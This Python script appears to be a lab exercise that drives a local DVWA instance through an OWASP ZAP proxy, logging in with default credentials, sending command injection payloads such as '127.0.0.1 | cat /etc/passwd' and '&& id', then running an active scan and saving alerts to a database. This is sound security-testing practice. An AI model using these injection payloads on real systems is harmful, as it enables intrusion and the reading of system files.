from zapv2 import ZAPv2
from db import alerts_col
from dotenv import load_dotenv
from datetime import datetime
import requests, time, os, urllib3

urllib3.disable_warnings()
load_dotenv()

API_KEY = os.getenv("ZAP_API_KEY")
ZAP_URL = os.getenv("ZAP_URL")
CMDI_TARGET = "http://127.0.0.1/dvwa/vulnerabilities/exec/"

zap = ZAPv2(apikey=API_KEY, proxies={"http": ZAP_URL, "https": ZAP_URL})
zap.forcedUser.set_forced_user_mode_enabled(False, apikey=API_KEY)

def access_cmdi_page():
    print("[*] Accessing Command Injection page through ZAP proxy...")
    session = requests.Session()
    session.proxies = {"http": ZAP_URL, "https": ZAP_URL}
    session.verify = False

    # Login first
    session.post("http://127.0.0.1/dvwa/login.php", data={
        "username": "admin", "password": "password", "Login": "Login"
    })
    session.post("http://127.0.0.1/dvwa/security.php",
                 data={"security": "low", "seclev_submit": "Submit"})

    # Send test payloads to cmdi page
    payloads = [
        "127.0.0.1",
        "127.0.0.1; ls",
        "127.0.0.1 && whoami",
        "127.0.0.1 | cat /etc/passwd",
        "127.0.0.1; id",
        "; ls -la",
        "| whoami",
        "&& id",
    ]
    print("[*] Sending command injection payloads...")
    for p in payloads:
        r = session.post(CMDI_TARGET,
                        data={"ip": p, "Submit": "Submit"},
                        timeout=10)
        result = "cmd_output_detected" if any(
            x in r.text for x in ["root", "www-data", "bin/bash", "passwd"]
        ) else "normal_response"
        print(f"    Payload: {p:35} | {r.status_code} | {result}")
        time.sleep(0.5)
    print("[+] Payloads sent — traffic captured in ZAP")

def run_cmdi_scan():
    print("\n[*] Running Command Injection active scan...")
    scan_id = zap.ascan.scan(CMDI_TARGET, apikey=API_KEY)
    time.sleep(2)
    while int(zap.ascan.status(scan_id)) < 100:
        print(f"    CMDi Scan: {zap.ascan.status(scan_id)}%")
        time.sleep(8)
    print("[+] Command Injection scan complete!")

    alerts = zap.core.alerts(baseurl=CMDI_TARGET)
    cmdi = [a for a in alerts if any(x in a.get("name","").lower()
            for x in ["command", "injection", "remote code", "exec"])]

    print(f"\n[+] Command Injection alerts: {len(cmdi)}")
    print(f"[+] Total alerts on page: {len(alerts)}")

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    docs = [{
        "scan_id": f"cmdi_{scan_id}",
        "scan_type": "targeted_cmdi",
        "timestamp": ts,
        "name": a.get("name",""),
        "risk": a.get("risk",""),
        "confidence": a.get("confidence",""),
        "url": a.get("url",""),
        "param": a.get("param",""),
        "attack": a.get("attack",""),
        "description": a.get("description",""),
        "solution": a.get("solution",""),
    } for a in alerts]

    if docs:
        alerts_col.insert_many(docs)

    for a in alerts:
        print(f"  [{a.get('risk','?'):13}] {a.get('name','')}")

    print(f"\n[✓] {len(docs)} alerts saved (scan_type: targeted_cmdi)")
    return docs

if __name__ == "__main__":
    access_cmdi_page()
    run_cmdi_scan()
    print("\n[✓] Day 7 Command Injection scan complete!")
